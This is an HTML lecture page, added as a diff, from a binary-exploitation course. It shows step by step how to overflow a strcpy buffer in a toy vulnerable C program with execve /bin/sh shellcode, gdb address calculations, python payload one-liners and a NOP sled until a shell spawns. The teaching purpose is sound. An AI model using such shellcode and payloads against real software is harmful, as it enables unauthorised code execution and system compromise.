@@ -1,0 +1,705 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>Lec. 11: Using Shell Code in Exploit</title>
+<!-- 2015-09-21 Mon 17:34 -->
+<meta  http-equiv="Content-Type" content="text/html;charset=utf-8">
+<meta  name="generator" content="Org-mode">
+<meta  name="author" content="Adam Aviv">
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { color: green; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
+
+  table { border-collapse:collapse; }
+  td, th { vertical-align:top;  }
+  th.right  { text-align: center;  }
+  th.left   { text-align: center;   }
+  th.center { text-align: center; }
+  td.right  { text-align: right;  }
+  td.left   { text-align: left;   }
+  td.center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara:nth-child(2) { display: inline; }
+  .footpara { display: block; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" type="text/css" href="../class.css" />
+<link rel="stylesheet" type="text/css" href="../print.css" media="print" />
+<div class="page-head">
+SI485H: Stack Based Binary Exploits and Defenses (F15)
+</div>
+<hr>
+<a href="../../index.html">Home</a> <a href="../../policy.html">Policy</a> <a href="../../cal.html">Calendar</a>  <a href="../../rsc/index.html">Resources</a>
+<hr>
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012  Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Lec. 11: Using Shell Code in Exploit</h1>
+<div id="table-of-contents">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents">
+<ul>
+<li><a href="#sec-1">1. Review Stack Smashing</a></li>
+<li><a href="#sec-2">2. Failed Attempt 1</a></li>
+<li><a href="#sec-3">3. Failed Attempt 2</a></li>
+<li><a href="#sec-4">4. SUCCESS!</a></li>
+<li><a href="#sec-5">5. Outside of GDB and NOP sledding</a></li>
+</ul>
+</div>
+</div>
+
+<div id="outline-container-sec-1" class="outline-2">
+<h2 id="sec-1"><span class="section-number-2">1</span> Review Stack Smashing</h2>
+<div class="outline-text-2" id="text-1">
+<p>
+In the last lesson we achieved some shell code that (1) had no fixed
+references and (2) had no null bytes. Now, it's time to use that shell
+code in an exploit. We will be exploiting the following program, which
+we've exploited before.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c" id="vulnerable.c"><span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdio.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;string.h&gt;</span>
+<span style="color: #b0c4de;">#include</span> <span style="color: #ffa07a;">&lt;stdlib.h&gt;</span>
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">bad</span>(){
+  printf(<span style="color: #ffa07a;">"You've been naughty!\n"</span>);
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">good</span>(){
+  printf(<span style="color: #ffa07a;">"Go Navy!\n"</span>);
+}
+
+<span style="color: #98fb98;">void</span> <span style="color: #87cefa;">vuln</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">n</span>, <span style="color: #98fb98;">char</span> * <span style="color: #eedd82;">str</span>){
+
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">i</span> = 0;  
+  <span style="color: #98fb98;">char</span> <span style="color: #eedd82;">buf</span>[32];
+
+
+  strcpy(buf,str);
+
+  <span style="color: #00ffff;">while</span>( i &lt; n ){
+    printf(<span style="color: #ffa07a;">"%d %s\n"</span>,i++, buf);
+  }
+
+}
+
+<span style="color: #98fb98;">int</span> <span style="color: #87cefa;">main</span>(<span style="color: #98fb98;">int</span> <span style="color: #eedd82;">argc</span>, <span style="color: #98fb98;">char</span> *<span style="color: #eedd82;">argv</span>[]){
+
+  vuln(atoi(argv[1]), argv[2]);
+
+  <span style="color: #00ffff;">return</span> 0;
+
+}
+</pre>
+</div>
+
+<p>
+Recall, if we send too much input on the command line, we can cause
+this program to execute the good() or bad function at will. In
+particular, looking at the assembly of vuln(),
+</p>
+
+<pre class="example">
+(gdb) ds vuln
+Dump of assembler code for function vuln:
+   0x080484d5 &lt;+0&gt;:	push   ebp
+   0x080484d6 &lt;+1&gt;:	mov    ebp,esp
+   0x080484d8 &lt;+3&gt;:	sub    esp,0x48
+   0x080484db &lt;+6&gt;:	mov    DWORD PTR [ebp-0xc],0x0
+   0x080484e2 &lt;+13&gt;:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080484e5 &lt;+16&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x080484e9 &lt;+20&gt;:	lea    eax,[ebp-0x2c]
+   0x080484ec &lt;+23&gt;:	mov    DWORD PTR [esp],eax
+   0x080484ef &lt;+26&gt;:	call   0x8048360 &lt;strcpy@plt&gt;
+   0x080484f4 &lt;+31&gt;:	jmp    0x8048516 &lt;vuln+65&gt;
+   0x080484f6 &lt;+33&gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x080484f9 &lt;+36&gt;:	lea    edx,[eax+0x1]
+   0x080484fc &lt;+39&gt;:	mov    DWORD PTR [ebp-0xc],edx
+   0x080484ff &lt;+42&gt;:	lea    edx,[ebp-0x2c]
+   0x08048502 &lt;+45&gt;:	mov    DWORD PTR [esp+0x8],edx
+   0x08048506 &lt;+49&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x0804850a &lt;+53&gt;:	mov    DWORD PTR [esp],0x804860e
+   0x08048511 &lt;+60&gt;:	call   0x8048350 &lt;printf@plt&gt;
+   0x08048516 &lt;+65&gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x08048519 &lt;+68&gt;:	cmp    eax,DWORD PTR [ebp+0x8]
+   0x0804851c &lt;+71&gt;:	jl     0x80484f6 &lt;vuln+33&gt;
+   0x0804851e &lt;+73&gt;:	leave  
+   0x0804851f &lt;+74&gt;:	ret    
+End of assembler dump.
+</pre>
+
+<p>
+we see that the buffer <code>buf</code> starts at <code>ebp-0x2c</code> so if we write
+<code>0x2c+4</code> or <code>0x30</code> A's, we'll reach the return address. Then we can write the
+address of good() or bad() (or both) to get it execute those programs:
+</p>
+
+<pre class="example">
+(gdb) ds good
+Dump of assembler code for function good:
+   0x080484c1 &lt;+0&gt;:	push   ebp
+   0x080484c2 &lt;+1&gt;:	mov    ebp,esp
+   0x080484c4 &lt;+3&gt;:	sub    esp,0x18
+   0x080484c7 &lt;+6&gt;:	mov    DWORD PTR [esp],0x8048605
+   0x080484ce &lt;+13&gt;:	call   0x8048370 &lt;puts@plt&gt;
+   0x080484d3 &lt;+18&gt;:	leave  
+   0x080484d4 &lt;+19&gt;:	ret    
+End of assembler dump.
+(gdb) ds bad
+Dump of assembler code for function bad:
+   0x080484ad &lt;+0&gt;:	push   ebp
+   0x080484ae &lt;+1&gt;:	mov    ebp,esp
+   0x080484b0 &lt;+3&gt;:	sub    esp,0x18
+   0x080484b3 &lt;+6&gt;:	mov    DWORD PTR [esp],0x80485f0
+   0x080484ba &lt;+13&gt;:	call   0x8048370 &lt;puts@plt&gt;
+   0x080484bf &lt;+18&gt;:	leave  
+   0x080484c0 &lt;+19&gt;:	ret    
+End of assembler dump.
+(gdb) r 5 `python -c "print 'A'*0x30+'\xc1\x84\x04\x08'+'\xad\x84\x04\x08'"`
+Starting program: /home/user/git/si485-binary-exploits/lec/10/demo/vulnerable 5 `python -c "print 'A'*0x30+'\xc1\x84\x04\x08'+'\xad\x84\x04\x08'"`
+Go Navy!
+You've been naughty!
+
+Program received signal SIGSEGV, Segmentation fault.
+0xbffff800 in ?? ()
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-2" class="outline-2">
+<h2 id="sec-2"><span class="section-number-2">2</span> Failed Attempt 1</h2>
+<div class="outline-text-2" id="text-2">
+<p>
+To make use of this exploit and have it execute our shell code, we
+need to overwrite the return address such that it jumps into our shell
+code. We have a couple of ways to do this, and we will now enumerate
+some that do not work until we get to one that does.
+</p>
+
+<p>
+In this attempt, we will send our shell code along with the exploit
+such that we will jump to the start of the <code>buf</code> in the code. It will
+look something like this:
+</p>
+
+
+<pre class="example">
+                .-------------------------.
+                |                         |
+                v                         |
+./vulnerable 5 &lt;shell-code&gt;&lt;padding&gt;&lt;address-of-buf&gt;
+</pre>
+
+<p>
+Once the exploit is complete, the overwritten return address will be
+the address of the buffer, and thus we execute our shell code. To
+start, we need to know how long our shell code is and we need to know
+the address of the buffer. 
+</p>
+
+<p>
+To get the length of our shell code, we can use <code>printf</code> and <code>wc</code>
+</p>
+<pre class="example">
+user@si485H-base:demo$ ./hexify.sh ./execve_nonull 
+\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\x89\xe1\x89\xf3\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\xb0\x01\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
+user@si485H-base:demo$ printf "`./hexify.sh ./execve_nonull`" | wc -c
+37
+</pre>
+<p>
+To make things easier, I'm going to save the bytes of the shell code
+to a file called <code>shell</code>.
+</p>
+<pre class="example">
+user@si485H-base:demo$ printf "`./hexify.sh ./execve_nonull`" &gt; shell
+user@si485H-base:demo$ wc -c shell 
+37 shell
+</pre>
+
+<p>
+Next, I'm going to start up gdb to determine the address of <code>buf</code>
+using our expected exploit length. I'll just start with 0xdeadbeef as
+the address for a filler.
+</p>
+
+<pre class="example">
+(gdb) r 5 `python -c "sh=open('shell').read(); print sh+'A'*(0x30-len(sh))+'\xef\xbe\xad\xde'"`
+
+Starting program: /home/user/git/si485-binary-exploits/lec/10/demo/vulnerable 5 `python -c "sh=open('shell').read(); print sh+'A'*(0x30-len(sh))+'\xef\xbe\xad\xde'"`
+
+Breakpoint 1, 0x080484db in vuln ()
+(gdb) ds
+Dump of assembler code for function vuln:
+   0x080484d5 &lt;+0&gt;:	push   ebp
+   0x080484d6 &lt;+1&gt;:	mov    ebp,esp
+   0x080484d8 &lt;+3&gt;:	sub    esp,0x48
+=&gt; 0x080484db &lt;+6&gt;:	mov    DWORD PTR [ebp-0xc],0x0
+   0x080484e2 &lt;+13&gt;:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080484e5 &lt;+16&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x080484e9 &lt;+20&gt;:	lea    eax,[ebp-0x2c]
+   0x080484ec &lt;+23&gt;:	mov    DWORD PTR [esp],eax
+   0x080484ef &lt;+26&gt;:	call   0x8048360 &lt;strcpy@plt&gt;
+   0x080484f4 &lt;+31&gt;:	jmp    0x8048516 &lt;vuln+65&gt;
+   0x080484f6 &lt;+33&gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x080484f9 &lt;+36&gt;:	lea    edx,[eax+0x1]
+   0x080484fc &lt;+39&gt;:	mov    DWORD PTR [ebp-0xc],edx
+   0x080484ff &lt;+42&gt;:	lea    edx,[ebp-0x2c]
+   0x08048502 &lt;+45&gt;:	mov    DWORD PTR [esp+0x8],edx
+   0x08048506 &lt;+49&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x0804850a &lt;+53&gt;:	mov    DWORD PTR [esp],0x804860e
+   0x08048511 &lt;+60&gt;:	call   0x8048350 &lt;printf@plt&gt;
+   0x08048516 &lt;+65&gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x08048519 &lt;+68&gt;:	cmp    eax,DWORD PTR [ebp+0x8]
+   0x0804851c &lt;+71&gt;:	jl     0x80484f6 &lt;vuln+33&gt;
+   0x0804851e &lt;+73&gt;:	leave  
+   0x0804851f &lt;+74&gt;:	ret    
+End of assembler dump.
+(gdb) p $ebp-0xc
+$1 = (void *) 0xbffff5fc
+</pre>
+<p>
+So the address we need to overwrite is 0xbffff5fc instead of
+0xdeadbeef. Let's give that a try:
+</p>
+<pre class="example">
+gdb) r 5 `python -c "sh=open('shell').read(); print sh+'A'*(0x30-len(sh))+'\xfc\xf5\xff\xbf'"`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/git/si485-binary-exploits/lec/10/demo/vulnerable 5 `python -c "sh=open('shell').read(); print sh+'A'*(0x30-len(sh))+'\xfc\xf5\xff\xbf'"`
+
+Breakpoint 1, 0x080484db in vuln ()
+(gdb) c
+Continuing.
+[Inferior 1 (process 6932) exited normally]
+</pre>
+<p>
+And, we FAIL! What happened?
+</p>
+
+<p>
+Let's do that again, and inspect the stack a bit more. 
+</p>
+
+<pre class="example">
+gdb) r 5 `python -c "sh=open('shell').read(); print sh+'A'*(0x30-len(sh))+'\x1c\xf6\xff\xbf'"`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/git/si485-binary-exploits/lec/10/demo/vulnerable 5 `python -c "sh=open('shell').read(); print sh+'A'*(0x30-len(sh))+'\x1c\xf6\xff\xbf'"`
+
+Breakpoint 1, 0x080484db in vuln ()
+(gdb) ni 6
+0x080484f4 in vuln ()
+(gdb) ds
+Dump of assembler code for function vuln:
+   0x080484d5 &lt;+0&gt;:	push   ebp
+   0x080484d6 &lt;+1&gt;:	mov    ebp,esp
+   0x080484d8 &lt;+3&gt;:	sub    esp,0x48
+   0x080484db &lt;+6&gt;:	mov    DWORD PTR [ebp-0xc],0x0
+   0x080484e2 &lt;+13&gt;:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080484e5 &lt;+16&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x080484e9 &lt;+20&gt;:	lea    eax,[ebp-0x2c]
+   0x080484ec &lt;+23&gt;:	mov    DWORD PTR [esp],eax
+   0x080484ef &lt;+26&gt;:	call   0x8048360 &lt;strcpy@plt&gt;
+=&gt; 0x080484f4 &lt;+31&gt;:	jmp    0x8048516 &lt;vuln+65&gt;
+   0x080484f6 &lt;+33&gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x080484f9 &lt;+36&gt;:	lea    edx,[eax+0x1]
+   0x080484fc &lt;+39&gt;:	mov    DWORD PTR [ebp-0xc],edx
+   0x080484ff &lt;+42&gt;:	lea    edx,[ebp-0x2c]
+   0x08048502 &lt;+45&gt;:	mov    DWORD PTR [esp+0x8],edx
+   0x08048506 &lt;+49&gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x0804850a &lt;+53&gt;:	mov    DWORD PTR [esp],0x804860e
+   0x08048511 &lt;+60&gt;:	call   0x8048350 &lt;printf@plt&gt;
+   0x08048516 &lt;+65&gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x08048519 &lt;+68&gt;:	cmp    eax,DWORD PTR [ebp+0x8]
+   0x0804851c &lt;+71&gt;:	jl     0x80484f6 &lt;vuln+33&gt;
+   0x0804851e &lt;+73&gt;:	leave  
+   0x0804851f &lt;+74&gt;:	ret    
+End of assembler dump.
+(gdb)
+</pre>
+
+<p>
+At this point, we are right after the call, so we can take a look
+around and we should see our shell code at the address <code>ebp-0x2c</code> and
+the return address.
+</p>
+<pre class="example">
+(gdb) x/x $ebp+0x4
+0xbffff62c:	0xbffff5fc
+(gdb) x/16i 0xbffff5fc
+   0xbffff5fc:	jmp    0xbffff615
+   0xbffff5fe:	pop    esi
+   0xbffff5ff:	xor    eax,eax
+   0xbffff601:	push   eax
+   0xbffff602:	push   esi
+   0xbffff603:	xor    edx,edx
+   0xbffff605:	mov    ecx,esp
+   0xbffff607:	mov    ebx,esi
+   0xbffff609:	mov    al,0xb
+   0xbffff60b:	int    0x80
+   0xbffff60d:	xor    ebx,ebx
+   0xbffff60f:	xor    eax,eax
+   0xbffff611:	mov    al,0x1
+   0xbffff613:	int    0x80
+   0xbffff615:	call   0xbffff5fe
+   0xbffff61a:	das    
+(gdb) p $ebp-0x2c
+$2 = (void *) 0xbffff5fc
+</pre>
+
+<p>
+Everything loks good so far. There is the shell code and in the right
+place. Looking closer, we should expect at 0xbfffff61a to be the
+string "/bin/sh" as this is jmp-callback. Let's take a look:
+</p>
+<pre class="example">
+(gdb) x/s 0xbffff61a
+0xbffff61a:	"/bin/sh", 'A' &lt;repeats 11 times&gt;, "\374\365\377\277"
+</pre>
+
+<p>
+Woops! We see our "/bin/sh" string but we also see a sh*ton of A's
+following. That is to be expected given the way we set up our exploit:
+</p>
+
+
+<pre class="example">
+                .-------------------------.
+                |                         |
+                v                         |
+./vulnerable 5 &lt;shell-code&gt;&lt;padding&gt;&lt;address-of-buf&gt;
+</pre>
+
+
+<p>
+The padding occurs after our shell code, and now we are toast. We
+can't NULL terminate our shell-code because that means we won't pad
+out to the return address. We need to do something different. 
+</p>
+</div>
+</div>
+<div id="outline-container-sec-3" class="outline-2">
+<h2 id="sec-3"><span class="section-number-2">3</span> Failed Attempt 2</h2>
+<div class="outline-text-2" id="text-3">
+<p>
+This time, we'll change strategies a bit. Instead of jumping
+backwards, let's jump forward. Here's what I propose:
+</p>
+<pre class="example">
+                                          .-----------.
+                                          |           |
+                                          |           v
+./vulnerable 5 &lt;--------padding-----&gt;&lt;address-of-buf&gt;&lt;shell code&gt;
+</pre>
+
+<p>
+Again, we need to use gdb to do some address calculations to find out
+where the start of our shell code is. I'll format the exploit of the
+right length and use 0xdeadbeef as the return address filler to
+calculate the start of the shell code which should be at <code>ebp+0x8</code>,
+four bytes further than the return address.
+</p>
+
+<pre class="example">
+(gdb) p $ebp-0x2cQuit
+(gdb) r 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\xfc\xf5\xff\xbf'+sh"`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/git/si485-binary-exploits/lec/10/demo/vulnerable 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\xfc\xf5\xff\xbf'+sh"`
+
+Breakpoint 1, 0x080484db in vuln ()
+(gdb) x/x $ebp+8
+0xbffff600:	0x05
+</pre>
+
+<p>
+Again, so the next address following the return address is
+0xbfffff600.  Um &#x2026; that is not going to work because that address
+has a NULL byte in it!
+</p>
+</div>
+</div>
+
+<div id="outline-container-sec-4" class="outline-2">
+<h2 id="sec-4"><span class="section-number-2">4</span> SUCCESS!</h2>
+<div class="outline-text-2" id="text-4">
+<p>
+Ok, so we need to jump 8 bytes further from the return address to skip
+of that null byte address. This time our shell code exploit looks like
+this:
+</p>
+<pre class="example">
+                                          .------------------------.
+                                          |                        |
+                                          |                        v
+./vulnerable 5 &lt;--------padding-----&gt;&lt;address-of-shelcode&gt;&lt;padding&gt;&lt;shell code&gt;
+</pre>
+
+<p>
+Again, I'll do an address calculation to see where we are. We know what that addres
+</p>
+<pre class="example">
+(gdb) r 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\xef\xbe\xad\xde'+'A'*4+sh+'\x00'"`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/git/si485-binary-exploits/lec/10/demo/vulnerable 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\xef\xbe\xad\xde'+'A'*4+sh+'\x00'"`
+
+Breakpoint 1, 0x080484db in vuln ()
+(gdb) ni 6
+0x080484f4 in vuln ()
+(gdb) x/x $ebp+0xc
+0xbffff604:	0x315e17eb
+(gdb) x/3wx $ebp
+0xbffff5f8:	0x41414141	0xdeadbeef	0x41414141
+</pre>
+<p>
+We are looking to jump to the address 0xbffff604.
+</p>
+<pre class="example">
+(gdb) r 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\x04\xf6\xff\xbf'+'A'*4+sh+'\x00'"`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/git/si485-binary-exploits/lec/10/demo/vulnerable 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\x04\xf6\xff\xbf'+'A'*4+sh+'\x00'"`
+
+Breakpoint 1, 0x080484db in vuln ()
+(gdb) c
+Continuing.
+process 7017 is executing new program: /bin/dash
+$
+</pre>
+
+<p>
+Boom!
+</p>
+</div>
+</div>
+<div id="outline-container-sec-5" class="outline-2">
+<h2 id="sec-5"><span class="section-number-2">5</span> Outside of GDB and NOP sledding</h2>
+<div class="outline-text-2" id="text-5">
+<p>
+The last step in this process is to get the exploit to work outside of
+gdb. If we just drop our exploit into the command line, it doesn't
+work:
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./vulnerable 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\x04\xf6\xff\xbf'+'A'*4+sh+'\x00'"`
+Segmentation fault (core dumped)
+</pre>
+
+<p>
+The reason problem is that gdb changes the stack layout, so all the
+addresses within gdb are <i>lower</i> than they would be outside gdb as
+they are more values on the stack. Visually we can see something like
+this for how our exploit works:
+</p>
+
+
+<pre class="example">
+  with gdb                 without gdb
+
+.------------.           .------------.
+|            |           |            |
+| gdb junk   |           :            :  
+|            |            
+:            :           :            :
+                         |            |
+:            :           | shell code |
+|            |           | padding    |
+|            |           | ret addr   |--.
+|            |           :            :  |
+| shell code | &lt;-.                     &lt;-'
+| padding    |   |                            
+| ret addr   |---'
+</pre>
+
+
+<p>
+Without the gdb code, everything get's shifted up the stack, but the
+value we are overwriting the return address to is now point to the
+same old place where the shell code <i>used</i> to be. It is now somewhere
+else. 
+</p>
+
+<p>
+The primary way to correct this is to add nops to shift the stack
+space around. A nop (read no-operation) is a special instruction that
+does nothing. The byte code for nop is 0x90. With nops Well shift the
+address space like so:
+</p>
+
+<pre class="example">
+  without nops           with nops         
+
+.------------.         .------------.
+|            |         |            |
+:            :         :            :
+
+:            :         :            :
+|            |         |            |
+| shell code |         | shell code |
+| padding    |         | nop        |
+| ret addr   |--.      | nop        |
+:            :  |      | nop        |
+              &lt;-'      | nop        |&lt;-.
+                       | padding    |  |
+                       | ret addr   |--'
+</pre>
+
+<p>
+The sequenences of nops form a "nop sled." If control jumps anywhere
+within the nop sled, we'll do a bunch of no operations until we reach
+the shell code. Our exploit will look like this:
+</p>
+
+<pre class="example">
+                                          .-----------------------.
+                                          |                       | 
+                                          |                       v
+./vulnerable 5 &lt;--------padding-----&gt;&lt;address-of-nopsled&gt;&lt;padding&gt;&lt;nop-sled&gt;&lt;shell code&gt;
+</pre>
+
+
+
+
+<p>
+How many nop's do we add? It doesn't matter, but we
+can try and see.
+</p>
+
+<pre class="example">
+user@si485H-base:demo$ ./vulnerable 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\x04\xf6\xff\xbf'+'A'*4 + '\x90'*0x10 + sh+'\x00'"`
+Segmentation fault (core dumped)
+user@si485H-base:demo$ ./vulnerable 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\x04\xf6\xff\xbf'+'A'*4 + '\x90'*0x20 + sh+'\x00'"`
+Illegal instruction (core dumped)
+user@si485H-base:demo$ ./vulnerable 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\x04\xf6\xff\xbf'+'A'*4 + '\x90'*0x30 + sh+'\x00'"`
+Illegal instruction (core dumped)
+user@si485H-base:demo$ ./vulnerable 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\x04\xf6\xff\xbf'+'A'*4 + '\x90'*0x40 + sh+'\x00'"`
+Illegal instruction (core dumped)
+user@si485H-base:demo$ ./vulnerable 5 `python -c "sh=open('shell').read(); print 'A'*(0x30)+'\x04\xf6\xff\xbf'+'A'*4 + '\x90'*0x50 + sh+'\x00'"`
+$
+</pre>
+
+<p>
+After 0x50 nop's our return address hits the sled, and BOOM, we got a shell. 
+</p>
+</div>
+</div>
+</div>
+</body>
+</html>
